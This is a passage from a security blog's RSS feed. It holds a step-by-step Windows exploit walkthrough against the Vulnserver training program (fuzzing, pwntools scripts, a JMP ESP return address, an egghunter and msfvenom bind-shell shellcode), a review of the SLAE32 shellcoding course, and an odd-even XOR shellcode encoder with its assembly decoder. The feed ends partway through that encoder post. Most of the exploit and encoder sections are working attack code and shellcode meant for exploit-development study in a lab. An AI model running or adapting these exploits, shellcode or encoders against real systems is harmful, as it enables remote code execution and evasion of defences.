    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'###########'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Check sum = {}'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sumCheck&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://twitter.com/ihack4falafel&quot;&gt;@ihack4falafel&lt;/a&gt; also created a tool way more complete than mine btw (cheers, bro!) that uses the same techinque for encoding a shellcode. You can check &lt;a href=&quot;https://github.com/ihack4falafel/Slink&quot;&gt;Slink&lt;/a&gt; here.&lt;/p&gt;
</description>
				<pubDate>Fri, 05 Oct 2018 00:00:00 -0300</pubDate>
				<link>/re/exploit/2018/10/05/sub-encoding.html</link>
				<guid isPermaLink="true">/re/exploit/2018/10/05/sub-encoding.html</guid>
			</item>
		
			<item>
				<title>Exploiting Vulnserver GTER (egghunter + pwntools)</title>
				<description>&lt;p&gt;Vulnserver is one of the best tools to practice Windows binary exploitation. It is also highly recommended as complementary training for the OSCE certification.&lt;/p&gt;

&lt;p&gt;You can download it from &lt;a href=&quot;https://github.com/stephenbradshaw/vulnserver&quot;&gt;here&lt;/a&gt; along with the required essfunc.dll file.&lt;/p&gt;

&lt;p&gt;There are multiple ways to exploit it, using the different parameters avaliable. This time we will exploit it using the GTER parameter. You might also find awesome writeups &lt;a href=&quot;https://capt-meelo.github.io/exploitdev/osceprep/2018/06/28/vulnserver-gter.html&quot;&gt;here&lt;/a&gt; and &lt;a href=&quot;https://www.absolomb.com/2018-07-24-VulnServer-GTER/&quot;&gt;here&lt;/a&gt;, the later using a techinque different from the one I used here.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/vulnserver/vulnserver_gter_1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Deployed environment:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Client: Kali Linux (VM) - 192.168.0.51&lt;/li&gt;
  &lt;li&gt;Server: Windows XP SP3 (VM) - 192.168.0.57&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;fuzzing&quot;&gt;Fuzzing&lt;/h2&gt;
&lt;p&gt;One of the best ways to start is fuzzing the application. I will use the SPIKE fuzzer for this task, but you might prefer newer ones like &lt;a href=&quot;https://github.com/jtpereyda/boofuzz&quot;&gt;boofuzz&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;In order to build our SPIKE template we need first to understand how the messages flow between the client and the server. To do that we open Wireshark and connect to the server:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/vulnserver/vulnserver_gter_2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/vulnserver/vulnserver_gter_3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we can create our template an fuzz the GTER parameter.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;s_read_packet();
s_string(&quot;GTER &quot;);
s_string_variable(&quot;123&quot;);
s_string(&quot;\r\n&quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we attach OllyDbg to vulnserver and run SPIKE:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;generic_send_tcp 192.168.0.57 6666 gter.spk 0 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/vulnserver/vulnserver_gter_4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/vulnserver/vulnserver_gter_5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see from analyzing the stack that the program received 171 &lt;em&gt;A&lt;/em&gt;s along with the string ` /.:/` right after the GTER parameter:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00F4FA58   00038EC0  ASCII &quot;GTER /.:/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;pwntools-ftw&quot;&gt;pwntools FTW&lt;/h2&gt;
&lt;p&gt;In order to document our exploit and make it reusable we will write it down into a Python script. We will also use the awesome &lt;em&gt;pwntools&lt;/em&gt; module, although you could also accomplish this task by using the &lt;em&gt;sockets&lt;/em&gt; module directly.&lt;/p&gt;

&lt;p&gt;We first need to cofirm the payload offset that will overwrite EIP.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from pwn import *

def doCrash(size):
    conn = remote('192.168.0.57', 6666, typ='tcp')
    payload = &quot;GTER /.:/&quot; + cyclic_metasploit(size) + &quot;\r\n&quot;
    print(&quot;Sending: {}&quot;.format(payload))
    conn.send(payload)
    conn.close()

def getCrashBuffer(offset):
    return cyclic_metasploit_find(offset)

doCrash(1000)
print(&quot;EIP is overwritten at offset: {}&quot;.format(getCrashBuffer(0x66413066))) #151
print(&quot;ESP is overwritten at offset: {}&quot;.format(getCrashBuffer(0x32664131))) #155
print(&quot;Total buffer lenght: {}&quot;.format(getCrashBuffer(0x41376641))) #171
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;em&gt;cyclic_metasploit&lt;/em&gt; method generates a &lt;a href=&quot;http://mathworld.wolfram.com/deBruijnSequence.html&quot;&gt;De Bruijn&lt;/a&gt; sequence used by Metasploit, mona.py, gdb-peda and others. The &lt;em&gt;cyclic_metasploit_find&lt;/em&gt; method is used to find the offset of a specifc subsequence.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/vulnserver/vulnserver_gter_6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/vulnserver/vulnserver_gter_7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.jollyfrogs.com/&quot;&gt;JollyFrogs&lt;/a&gt; gently shared his pattern generator/finder script so we don’t even need to use pre-built stuff (slightly modified here). Cheers mate!&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from string import *
from termcolor import colored

def pattern_gen(int_length):
    &quot;&quot;&quot;
    Generate a pattern of a given length up to a maximum
    of 20280 - after this the pattern would repeat
    &quot;&quot;&quot;
    if int_length &amp;gt;= 20280: error_and_exit(&quot;[] Error: Pattern length exceeds max&quot;)
    pattern = &quot;&quot;
    for upper in ascii_uppercase:
        for lower in ascii_lowercase:
            for digit in digits:
                if len(pattern) &amp;lt; int_length:
                    pattern += upper+lower+digit
    return pattern

def pattern_search(str_search_pattern):
    &quot;&quot;&quot;
    Search for str_search_pattern in pattern.
    Looking for needle in haystack
    &quot;&quot;&quot;
    searchpattern = pattern_gen(20279)
    pattern = str_search_pattern
    if searchpattern.index(pattern) == None:
      error_and_exit(&quot;[] Error: Pattern not found&quot;)
    else:
      print(colored(&quot;[*] Pattern found at offset: &quot;+str(searchpattern.index(pattern)),&quot;green&quot;))

print(pattern_gen(100))
pattern_search('\x34\x41\x63\x35\x41\x63\x36')
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;1st-stage&quot;&gt;1st stage&lt;/h2&gt;
&lt;p&gt;The natural next step would be to overwrite EIP with the address to a buffer where the shellcode would be stored. Since ESP also points to our buffer, we could make EIP point to a &lt;code class=&quot;highlighter-rouge&quot;&gt;JMP ESP&lt;/code&gt; instruction. And here, my friends, is where we face our first issue.&lt;/p&gt;

&lt;p&gt;As you can see above, our whole buffer has only 171 bytes and ESP points to byte 155. This means we have a 20-bytes buffer to insert our payload! Since that is an insanely small buffer for virtually any shellcode, we must manage to use this space as a trampoline to another larger buffer.&lt;/p&gt;

&lt;p&gt;What about those 151 bytes before EIP? While this is not enough for a decent shellcode, which should count for at least 300 bytes, it is good enough for a somewhat more robust second stage.&lt;/p&gt;

&lt;p&gt;To find an address for &lt;code class=&quot;highlighter-rouge&quot;&gt;JMP ESP&lt;/code&gt; we can open the executable modules, pick &lt;code class=&quot;highlighter-rouge&quot;&gt;essfunc.dll&lt;/code&gt; and search for the desired command, in this case &lt;code class=&quot;highlighter-rouge&quot;&gt;\xAF\x11\x50\x62&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;To jump back the 151 bytes, we may assemble the &lt;code class=&quot;highlighter-rouge&quot;&gt;JMP SHORT -152&lt;/code&gt; instruction using &lt;a href=&quot;https://defuse.ca/online-x86-assembler.htm#disassembly&quot;&gt;this&lt;/a&gt; great site. The resulting opcode is &lt;code class=&quot;highlighter-rouge&quot;&gt;\xE9\x64\xFF\xFF\xFF&lt;/code&gt;, which fortunately does not contain any NULLs.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from pwn import *

def expl():
    conn = remote('192.168.0.57', 6666, typ='tcp')
    EIP = &quot;\xaf\x11\x50\x62&quot;
    jmpBack = &quot;\xe9\x64\xff\xff\xff&quot; #did not invert bytes since it goes to the stack!
    buf = &quot;A&quot;*147 + EIP + jmpBack + &quot;C&quot;*300
    payload = &quot;GTER /.:/&quot; + buf + &quot;\r\n&quot;
    conn.send(payload)
    print(conn.recv(1024))
    conn.close()

expl()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To verify we successfully control the program flow we set a breakpoint at &lt;code class=&quot;highlighter-rouge&quot;&gt;\xaf\x11\x50\x62&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/vulnserver/vulnserver_gter_8.png&quot; alt=&quot;8&quot; /&gt;
&lt;img src=&quot;http://localhost:4000/assets/media/vulnserver/vulnserver_gter_9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; one might also want to try subracting some bytes from ESP and the jumping into it instead of directly jumping to the hardcoded address. While this is a possible solution, you might find yourself struggling with stack alignmet issues, since you are altering ESP. In case you run into this problem, try adding the subtracted amount to ESP after the jump.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;2nd-stage&quot;&gt;2nd stage&lt;/h1&gt;
&lt;p&gt;Now we can use this relatively large buffer to insert our second stage. The obvious choice here is to use an egghunter.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from pwn import *

def expl():
    conn = remote('192.168.0.57', 6666, typ='tcp')
    EIP = &quot;\xAF\x11\x50\x62&quot;
    jmpBack = &quot;\xe9\x64\xff\xff\xff&quot; #not inverted bytes since it goes to the stack!

    #32 bytes egghunter - egg b33f
    eggHunter = &quot;\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x62\x33\x33\x66\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7&quot;
    buf = &quot;\x90&quot;*30 + eggHunter + &quot;\x90&quot;*85 + EIP + jmpBack + &quot;C&quot;*300
    payload = &quot;GTER /.:/&quot; + buf + &quot;\r\n&quot;
    conn.send(payload)
    print(conn.recv(1024))
    conn.close()

expl()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/vulnserver/vulnserver_gter_10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Notice we have set a few NOPs before and after the egghunter just to make the exploit a little more reliable (30 NOPs + 32 egghunter + 85 NOPs = 147 bytes).&lt;/p&gt;

&lt;h1 id=&quot;3rd-stage&quot;&gt;3rd stage&lt;/h1&gt;
&lt;p&gt;This is the most critical part in my opinion. Yes we decided to use an egghunter, great. The point is: how can we store the shellcode in some other place in memory? There is only one variable and we already know where it is mapped to!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgflip.com/12h1ju.jpg&quot; alt=&quot;Boxes everywhere!&quot; title=&quot;Boxes are round&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Remember all those other parameters in vulnserver? Well, we could use them to send the shellcode and hope for it to be stored in a large, smooth and happy buffer. THEN our egghunter will finally make sense!&lt;/p&gt;

&lt;p&gt;As we don’t know which parameter we should use, why not try each and every one of them? Except for GTER of course.
After running it we realize KSTET breaks our exploit so we also remove it.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from pwn import *

#msfvenom -a x86 --platform windows -p windows/shell_bind_tcp -e x86/mixed_alpha -f python
buf =  &quot;b33fb33f&quot; #eggegg
buf += &quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b&quot;
buf += &quot;\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7&quot;
buf += &quot;\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf&quot;
buf += &quot;\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c&quot;
buf += &quot;\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01&quot;
buf += &quot;\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31&quot;
buf += &quot;\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d&quot;
buf += &quot;\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66&quot;
buf += &quot;\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0&quot;
buf += &quot;\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f&quot;
buf += &quot;\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68&quot;
buf += &quot;\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8&quot;
buf += &quot;\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00&quot;
buf += &quot;\xff\xd5\x6a\x08\x59\x50\xe2\xfd\x40\x50\x40\x50\x68&quot;
buf += &quot;\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x11\x5c\x89&quot;
buf += &quot;\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x57&quot;
buf += &quot;\x68\xb7\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1&quot;
buf += &quot;\xff\xd5\x57\x97\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63&quot;
buf += &quot;\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59&quot;
buf += &quot;\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24&quot;
buf += &quot;\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56&quot;
buf += &quot;\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e&quot;
buf += &quot;\x56\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0&quot;
buf += &quot;\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c&quot;
buf += &quot;\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00&quot;
buf += &quot;\x53\xff\xd5&quot;


def expl():
    conn = remote('192.168.0.57', 6666, typ='tcp')
    EIP = &quot;\xAF\x11\x50\x62&quot;
    jmpBack = &quot;\xe9\x64\xff\xff\xff&quot; #not inverted bytes since it goes to the stack!
    #32 bytes egghunter
    eggHunter = &quot;\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x62\x33\x33\x66\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7&quot;
    buf = &quot;\x90&quot;*30 + eggHunter + &quot;\x90&quot;*85 + EIP + jmpBack + &quot;C&quot;*300
    payload = &quot;GTER /.:/&quot; + buf + &quot;\r\n&quot;
    conn.send(payload)
    print(conn.recv(1024))
    conn.close()

def runOptions(buf):
    for op in ['STATS', 'RTIME', 'LTIME', 'SRUN', 'TRUN', 'GMON', 'GDOG', 'HTER', 'LTER', 'KSTAN']: #removed GTER and KSTET
        conn = remote('192.168.0.57', 6666, typ='tcp')
        payload = op + &quot; &quot; + buf
        print('Sending: {}'.format(payload))
        conn.send(payload)
        print(conn.recv(1024))
        conn.close()

runOptions(buf)
expl()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/vulnserver/vulnserver_gter_11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/vulnserver/vulnserver_gter_12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Windows XP SP3 has DEP enabled by default. In order to correcly run this exploit you must turn DEP off for vulnserver.exe.&lt;/p&gt;
&lt;/blockquote&gt;
</description>
				<pubDate>Thu, 27 Sep 2018 00:00:00 -0300</pubDate>
				<link>/re/exploit/2018/09/27/vulnserver-gter-egghunter.html</link>
				<guid isPermaLink="true">/re/exploit/2018/09/27/vulnserver-gter-egghunter.html</guid>
			</item>
		
			<item>
				<title>SLAE32 review</title>
				<description>&lt;p&gt;&lt;strong&gt;TL;DR&lt;/strong&gt;: &lt;a href=&quot;http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html&quot;&gt;SLAE32 course&lt;/a&gt; is great and you should do it if you are a beginner/intermediate. A little bit outdated but still absolutely valid. A piece of art for the price charged.&lt;/p&gt;

&lt;p&gt;I have finally completed the SLAE32 course and certification by Security Training a few months after purchasing it. This review reflects solely my very own experience and should not be taken for granted by anyone.&lt;/p&gt;

&lt;h2 id=&quot;what-to-expect&quot;&gt;What to expect&lt;/h2&gt;
&lt;p&gt;SLAE32 is a course about x86 shellcodes. Not pwn, reverse engineering, malware analysis, CTFs or anything alike. Most of the course goes about writing x86 assembly code and debugging it, along with techniques to encode and encrypt shellcodes.&lt;/p&gt;

&lt;p&gt;It is divided in 2 modules:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Module 1&lt;/strong&gt; - walks you through most of the juicy x86 instructions in a very effective way. It might be considered a comprehensible introduction to assembly and is the basis for the next module.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Module 2&lt;/strong&gt; - begins with a simple &lt;em&gt;exit()&lt;/em&gt; shellcode then goes through the JMP-CALL-POP technique, encoders, polymorhphism, shellcode analysis and crypters.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Both parts are totally hands-on focused. There has not been a single moment I did not had both my video player and a terminal open. I followed line-by-line the instructions Vivek typed but not limiting to it. I also tried more modern encoders, read Phrack articles and broke stuff in unintend ways. I think this is how the course should be taken, allowing yourself to explore the introduced concepts in an empirical manner.&lt;/p&gt;

&lt;p&gt;I have also received for free the GDB course by Security Training. I have not checked it out since I believed my GDB skills were enough for completing SLAE. Nevertheless, I have been told it is an awesome introduction to debuggers.&lt;/p&gt;

&lt;h2 id=&quot;who-should-take-it&quot;&gt;Who should take it?&lt;/h2&gt;
&lt;p&gt;I do not see it as an advanced course although it covers a topic most beginners are generally not used to. Some previous x86 knowledge would be nice and C experience would not hurt. A reasonable understanding of compiling/assmblying/linking processes would also help, along with knowledge about how the stack works. All in all, it is a beginner focused course and with enough time and dedication anyone should be able to complete it. As the official site states:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;This course starts from the very basics of programming in Assembly Language and does not expect students to have prior programming experience.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;certification&quot;&gt;Certification&lt;/h2&gt;
&lt;p&gt;This is was a really neat surprise for me. I never acquired the course for the certification, but for the knowledge itself. However, having a concrete goal is great for keeping the focus and not quitting for any reason. After all, I had already invested $100+ and not getting the certification would make this a wasted money.&lt;/p&gt;

&lt;p&gt;The certification format is unusual, which has positive and negative aspects. First of all, it is an open exam. The last video of module 2 presents the 7 assignments one must complete. There is no time for finishing them or a strict answer template. Even more curious, you must publish all the assignments online! So yeah, everybody else’s exams are there if you want to snoop around.&lt;/p&gt;

&lt;p&gt;I must say at first I did not like this model of certification. I thought it might be a good idea but would certainly nullify the certification value, since it could not guarantee that the examinee really did everything on his own instead of just cheating. It happens the proposed assignments were very well chosen. Considering that the Security Training staff checks the assignments, even if the candidate took a look at other students previous exams it would not invalidate his answer. The
assignments are complex and long in a way that even reproducing someone’s answer would prove a certain degree of knowledge and effort.&lt;/p&gt;

&lt;p&gt;One way or the other, with so much this course has to offer I do not think you should care all that much about whether the certification itself might get you that dream job or not. However, you should &lt;strong&gt;absolutely&lt;/strong&gt; do it. This was the best part for me as I learned more with the assignments then with all the videos. It took me about 2 weeks studying about 3 everyday in order to finish it. Totally worth it.&lt;/p&gt;

&lt;p&gt;Another interesting aspect of the exam is that it forces you to write, blog and have a GitHub account. I know it takes time to document your steps and most people in our field consider it boring. But trust me, it is a real treasure to have your intellectual development process written down. It helps you to put things together in your mind, serves as a future source and also helps people around. How much have you not learned from blog posts after all?&lt;/p&gt;

&lt;p&gt;Not focusing on its market value, is what makes this certification great. Most highly valuable certs must have a strict format in order to keep their value. I do not think most people who take this course are doing it for the cert value (I did not at least). Indeed, this allows you to explore more while not loosing yourself in the abundant ocean of knowledge available.&lt;/p&gt;

&lt;h2 id=&quot;isnt-it-old-and-outdated&quot;&gt;Isn’t it old and outdated?&lt;/h2&gt;
&lt;p&gt;Not at all! This was one of my worries when I first started the course. I mean, the videos obvious show their age. The course uses Backtrack instead of Kali. Msfpayload instead of Msfvenom. Video quality is somewhat low. Audio quality too (with some funny/annoying background sounds depending on your mood). And yes, it is focused mostly in x86 and OSs without many protections, so do not expect to be coding shellcodes for your top notch Win10. There are other courses by Security Academy more focused on that.&lt;/p&gt;

&lt;p&gt;For the record, I did the whole course in my x64 Debian 9 and fully upgraded Kali. Smooth.&lt;/p&gt;

&lt;p&gt;That said, I would like to state none of the caveats above were significant to my learning. I can peacefully say I have learned A LOT of useful information. The bottom line is you must crawl before running. This is totally true and not different for this course. If you do not understand the basics of shellcoding in a simple WinXP how do you expect to bypass all those fancy ML-based security solutions?&lt;/p&gt;
</description>
				<pubDate>Sat, 08 Sep 2018 00:00:00 -0300</pubDate>
				<link>/re/exploit/2018/09/08/slae32-review.html</link>
				<guid isPermaLink="true">/re/exploit/2018/09/08/slae32-review.html</guid>
			</item>
		
			<item>
				<title>Assignment 4 - Odd-Even encoder</title>
				<description>&lt;h1 id=&quot;assignment-4&quot;&gt;Assignment #4&lt;/h1&gt;
&lt;blockquote&gt;
  &lt;p&gt;This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
Student ID: SLAE-1228&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;My idea for a custom encoder is very simple, in fact. In short, I broke the encoded shellcode in two parts: the even and odd positions. What this encoder does is reading the encoded string byte by byte and treating the bytes in odd and even positions differently. The biggest difficult was to create this decision making mechanism, which consists in two conditional jumps inside a loop. Depending whether it is an odd or even position, the current byte will be XORed with 0xAA or 0xBB.&lt;/p&gt;

&lt;h2 id=&quot;odd-even-xor-encoder&quot;&gt;Odd-Even XOR encoder&lt;/h2&gt;
&lt;p&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;python3.5&lt;/code&gt; for encoding the execve shellcode:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;shellcode = b&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;

encoded = &quot;&quot;
encoded2 = &quot;&quot;

for idx, x in enumerate(shellcode):
    if idx%2 == 0:
        y = x ^ 0xaa
    else:
        y = x ^ 0xbb

    encoded += '\\x'
    encoded += '%02x' % (y &amp;amp; 0xff)

    encoded2 += '0x'
    encoded2 += '%02x,' %(y &amp;amp; 0xff)

print(encoded)
print(encoded2)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Generating the encoded shellcode:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python3.5 encoder.py 
\x9b\x7b\xfa\xd3\x85\x94\xd9\xd3\xc2\x94\xc8\xd2\xc4\x32\x49\xeb\x23\x59\xf9\x32\x4b\x0b\xa1\x76\x2a
0x9b,0x7b,0xfa,0xd3,0x85,0x94,0xd9,0xd3,0xc2,0x94,0xc8,0xd2,0xc4,0x32,0x49,0xeb,0x23,0x59,0xf9,0x32,0x4b,0x0b,0xa1,0x76,0x2a,
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;odd-even-xor-decoder&quot;&gt;Odd-Even XOR decoder&lt;/h2&gt;
&lt;p&gt;After JMP-CALL-POP, we are inside the loop which runs over the whole encrypted shellcode (25 bytes). The first thing we do is checking whether the position index is even or odd and jump to the corresponding piece of code. After XORing the current byte of the encoded shellcode, it loops back to the &lt;code class=&quot;highlighter-rouge&quot;&gt;decode&lt;/code&gt; label, continuing the loop.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;global _start			

section .text
_start:
	jmp short call_shellcode

decoder:
	pop esi
	xor ecx, ecx
	mov cl, 25

decode:
	test cl, 1
	jz even   
	jnz odd
even:
	mov bx, [esi]
        xor bx, 0xBB
	mov [esi], bl

       inc esi
       loop decode
       jmp short EncodedShellcode
odd:
       mov bx, [esi]
       xor bx, 0xAA
       mov [esi], bl

       inc esi
       loop decode
       jmp short EncodedShellcode

call_shellcode:

	call decoder
	EncodedShellcode: db 0x9b,0x7b,0xfa,0xd3,0x85,0x94,0xd9,0xd3,0xc2,0x94,0xc8,0xd2,0xc4,0x32,0x49,0xeb,0x23,0x59,0xf9,0x32,0x4b,0x0b,0xa1,0x76,0x2a 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is a CFG visualization of the decoder generated by IDA.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/decoder.png&quot; alt=&quot;Decoder visualization&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;a-small-caveat&quot;&gt;A small caveat&lt;/h2&gt;
